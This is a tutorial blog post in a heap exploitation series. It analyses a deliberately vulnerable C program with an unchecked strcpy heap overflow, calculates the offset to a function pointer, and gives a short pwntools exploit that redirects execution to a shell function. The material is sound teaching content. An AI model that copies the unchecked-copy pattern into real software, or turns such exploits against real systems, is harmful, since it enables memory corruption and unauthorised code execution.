---
layout: default
title: Heap Exploitation Part 3
date: 2024-09-26
tag: ["exploitation", "heap", "glibc"] 
description: Heap Overflow
---

### **intro**

In this post we will take look at a simple heap overflow vulnerability and exploit the binary. The goal of this challenge to execute the shell function by exploiting the heapoverflow vulnerability.

---

### **Binary Info**

![Screenshot at 2024-09-26 12-50-04.png](/Heap%20Exploitation%20Part%203%20{Heap%20Overflow}%2039636a134fcd474aa1c13f9990b1fb87/Screenshot_at_2024-09-26_12-50-04.png)

You can see the information about the binary in the above image. i have recompiled this binary from the source code and disabled the stack canary and pie (Position Independent Executable) so that address of function does not change dynamicly every time we execute the binary..

---

### **Code Analysis**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct data{
    char string[0x20];
};

struct funcpointer{
    void (*fp)();
    char __pad[64 - sizeof(unsigned long)];
};

void shell() {
  system("/bin/bash");
}

void exploit(){
    printf("Exploit is completed, But where is the Shell >_<\n");
}

void fail(){
    printf("Looks like Your exploit did not worked this time!\n");
}

void vuln(char arg[]) {
    struct data *value;
    struct funcpointer *f;
    value = malloc(sizeof(struct data));  
    f = malloc(sizeof(struct funcpointer));
    f->fp = NULL;

    strcpy(value->string,arg); 

    if (strncmp(value->string, "exploited", 9) == 0) {
        f->fp = exploit;  
    }

    printf("data is at %p, fp is at %p, will be calling %p\n", value, f, f->fp);
    free(value);

    if (f->fp) {
        f->fp();
    }
    else {
            fail();
**    }
     
}

int main(int argc, char** argv) {
    if( argc < 2 ){
        printf("Enter the a string as agument\n");
        return  -1;
    }
    vuln(argv[1]);
    return 0;
}
```

So there are some function like `sehll` `exploit` `fail` `vuln` and  `main` 

In the main function we call the vuln and pass a command line argument to it. 

lets look at the `vuln` function. In the first two line we see the variables of the structures are being create one is *value*  and  *f*  and after that the memory is allocated for the structures. In the next line the NULL value is assigned to the function pointer `f->fp = NULL;` 

Now in the next line using the `strcpy` function the argument which we passed is being copied to the string variable which is member of the data struct. 

In the next line a comparison is taking place it compares the value of the string variable to exploited and it only compare the first 9 character of the string variable. if the comperison is success it assigns the address of exploit function to the function pointer like this `f->fp = exploit` 

In the next line it prints some data like the address of the `data` and `fp` structures and the address of the function which is stored in the function pointer and will be called. 

In the `if else` block if the function pointer hold some value and its not empty which means if it points to some function then it executes that function or if it dose not points to any function it will call the `fail` function. 

---

### **Debugging**

By running and passing a string argument to the binary we see it works as expected.  

![Screenshot at 2024-09-26 14-33-58.png](/Heap%20Exploitation%20Part%203%20%7BHeap%20Overflow%7D%2039636a134fcd474aa1c13f9990b1fb87/Screenshot_at_2024-09-26_14-33-58.png)
*The string comparison fails and because the function pointer is assigned to the null so the `else` block executes and call the fail function.* 


![Screenshot at 2024-09-26 14-41-50.png](/Heap%20Exploitation%20Part%203%20%7BHeap%20Overflow%7D%2039636a134fcd474aa1c13f9990b1fb87/b629a6fe-4269-4e2a-8309-cb8c22b116fe.png)

Now the string comparison is passed we can see it assigned the address of exploit function to the function pointer and now the `if` block is true which means the function pointer is not null or empty it holds some address and then `f->fp();`  invokes the exploit function. 

*So now we have a clear understanding of the binary so how do we execute `shell` function and get a shell. One thing we can do is we can over flow the heap and overwrite the function pointers value because if you look at the `strcpy` function there is no string length check is being performed which means you can provide arbitrary length of input data and it `strcpy` will copy it to the heap which will cause an overflow.*

### **RabbitHole of exploited**

So as we know that the strncmp function only check the first 9 character of our input let's try to input `exploited` followed by multiple `a` something like this `exploitedaaaaaaaaaaa.....`

![Screenshot at 2024-09-26 17-19-07.png](/Heap%20Exploitation%20Part%203%20%7BHeap%20Overflow%7D%2039636a134fcd474aa1c13f9990b1fb87/9cd1d124-ef0a-4336-9cb2-c3d274dd20a8.png)

hmmmm. it doesn’t look like we are able to overflow the heap chunk lets give it some more a’s 

![Screenshot at 2024-09-26 17-21-35.png](/Heap%20Exploitation%20Part%203%20%7BHeap%20Overflow%7D%2039636a134fcd474aa1c13f9990b1fb87/e7ab0639-1011-4530-8132-bd4f25260160.png)

Looks like we overflowed the heap and corrupted the top chunk’s size field but why we are able to overwrite the topcunk’s size field but not the function pointer. Because without overwriting the `functionpointer` chunk we can not overwrite the topchuck but we did overwrite the topchunk. we overflowed the function pointer so we as we know it should  point at the `0x6161616161616161` but still it points at `0x401210` which is the address of `exploit` function why this is happening. lets see why 

![Screenshot at 2024-09-26 17-32-33.png](/Heap%20Exploitation%20Part%203%20%7BHeap%20Overflow%7D%2039636a134fcd474aa1c13f9990b1fb87/Screenshot_at_2024-09-26_17-32-33.png)

so we can see we have two chunks the one will hold over string and other one holds the function pointer’s value. 

so the now co to the strcpy instruction and see how over help looks like after the strcpy is done.

![Screenshot at 2024-09-26 17-41-37.png](/Heap%20Exploitation%20Part%203%20%7BHeap%20Overflow%7D%2039636a134fcd474aa1c13f9990b1fb87/Screenshot_at_2024-09-26_17-41-37.png)

You can see we did overflow the function pointer which is at `0x4052d0` and the value is `0x61616161` Now lets step up and see why the program behave differently.

![Screenshot at 2024-09-26 18-23-42.png](/Heap%20Exploitation%20Part%203%20%7BHeap%20Overflow%7D%2039636a134fcd474aa1c13f9990b1fb87/Screenshot_at_2024-09-26_18-23-42.png)

The strncmp compare the first 9 character of our input to `exploited` and if it is equal the it will change the function pointer to `exploit` function according to the programs logic. 

```c
if (strncmp(value->string, "exploited", 9) == 0) {
		f->fp = exploit;  
}
```

![Screenshot at 2024-09-26 18-34-43.png](/Heap%20Exploitation%20Part%203%20%7BHeap%20Overflow%7D%2039636a134fcd474aa1c13f9990b1fb87/103070e0-a6d9-408c-920b-018703d2fd79.png)

Here it gets intersting and so even we overwrite the funtion pointer in the starting as the  programm progress and gets to `strncmp` condition. it will again overwrite the fuction pointer to `exploit` function.

![Screenshot at 2024-09-26 18-41-20.png](/Heap%20Exploitation%20Part%203%20%7BHeap%20Overflow%7D%2039636a134fcd474aa1c13f9990b1fb87/973adb6a-cc34-46ad-a323-5b9774ad0ede.png)

See the address `0x4052d0` holds the address of exploit function which is `0x401210`.

And after that the program works as expected it checks weather the function pointer holds some value. Then it execute that function pointer.

That’s why the program was always executed the `exploit` function. 

---

### **Exploitation**

How do we exploit this? you may be asking the answer is very simple we don’t have to pass the strcnmp check because if we pass the check eventually the program will change the value of function pointer to `exploit` which we don’t want to.

so lets try something different insted of passing `exploited` wee will pass bunch of `A's` 

![Screenshot at 2024-09-26 18-57-18.png](/Heap%20Exploitation%20Part%203%20%7BHeap%20Overflow%7D%2039636a134fcd474aa1c13f9990b1fb87/Screenshot_at_2024-09-26_18-57-18.png)

Now we get over lovely `segfault` because over function pointer  calls the `0x61616161616161` which is not a valid address and that’s why we get segfault. So the exploitation phases is very easy we just have to calculate how many bytes we have to overwrite so we can write the address `shell` function to the function pointer. 

There are two ways to calculate the address you can choose any one you like i will show you the both. 

***Using the cyclic pattern*** 

![Screenshot at 2024-09-26 19-07-09.png](/Heap%20Exploitation%20Part%203%20%7BHeap%20Overflow%7D%2039636a134fcd474aa1c13f9990b1fb87/91c15284-d609-4547-977c-fa7f77b1a58f.png)

***Using Heap Layout***

![Screenshot at 2024-09-26 17-32-33.png](/Heap%20Exploitation%20Part%203%20%7BHeap%20Overflow%7D%2039636a134fcd474aa1c13f9990b1fb87/Screenshot_at_2024-09-26_17-32-33%201.png)

Over input gets written at `0x4052a0` and the function pointer value stored at `0x4052d0` if we minus `0x4052d0 - 0x4052a0` we get `0x30` which converted to integer is `48` so we need to pass `48` `A` followed by the address of `shell` function. 

### **Exploit**

```python
#!/bin/python3

from pwn import *

context(os="linux",arch="amd64")

binary = "./overflow"
elf = ELF(binary)

payload = (b'A'* 48 + flat(elf.sym['shell'])).replace(b'\x00',b'')

target = elf.process(argv=[payload])

print(target.clean().decode('utf-8'))
target.interactive()
```

In this exploit i used the elf function of pwn tools which help me to get the address of shell function which is `0x4011f6` I use the elf function it make my exploitation process very easy.

Lets execute the exploit and see are did i worte the correct exploit 

![Screenshot at 2024-09-26 20-09-42.png](/Heap%20Exploitation%20Part%203%20%7BHeap%20Overflow%7D%2039636a134fcd474aa1c13f9990b1fb87/Screenshot_at_2024-09-26_20-09-42.png)

Boom!! it worked in the first try. you can see the exploit is successfull and i got the shell.

